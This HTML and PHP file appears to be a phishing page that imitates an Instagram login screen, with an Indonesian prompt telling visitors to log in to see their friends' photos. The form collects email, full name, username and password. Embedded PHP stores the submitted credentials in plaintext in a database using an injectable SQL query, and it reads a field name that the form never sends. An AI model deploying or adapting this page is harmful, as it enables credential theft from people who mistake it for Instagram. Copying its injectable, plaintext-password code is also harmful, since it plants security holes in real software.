<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Instagram</title>
	<link rel="stylesheet" type="text/css" href="noob.css">
</head>
	<body>
	<div id="container">
		<div class="header">
			Instagram<br>
			<img src="instagram.jpg" width="200px">
		</div>
		<div class="subheader">
			Login untuk melihat foto dan video <br>
			Dari teman kamu
		</div>
		<div class="content">
		<table border=0 align="center" cellpadding=5 cellspacing=0>
		<form action="hasil.php" method="post">
			<tr><td>Email<td/> <td>:</td> <td><input type="email" name="email" placeholder=" Email"></td></tr>
			<tr><td>Fullname<td/> <td>:</td> <td><input type="text" name="fullname" placeholder=" Fullname"></td></tr>
			<tr><td>Username<td/> <td>:</td> <td><input type="text" name="username" placeholder=" Username"></td></tr>
			<tr><td>Password<td/> <td>:</td> <td><input type="password" name="password" placeholder=" Password"></td></tr>
			<tr><td></td><td><td></td></td><td><input type="submit" name="Submit" value="LOGIN"></td></tr>
			<?php
 
    // Check If form submitted, insert form data into users table.
    if(isset($_POST['Submit'])) {
        $name = $_POST['name'];
        $email = $_POST['email'];
        $username = $_POST['username'];
        $password = $_POST['password'];
        include_once("config.php");
        $result = mysqli_query($mysqli, "INSERT INTO users(name,email,username,password) VALUES('$name','$email','$username','$password')");
        echo "User added successfully. <a href='index.php'>View Users</a>";
    }
    ?>

			</form>
		</table>
		</div>
	</div>
	</body>
</html>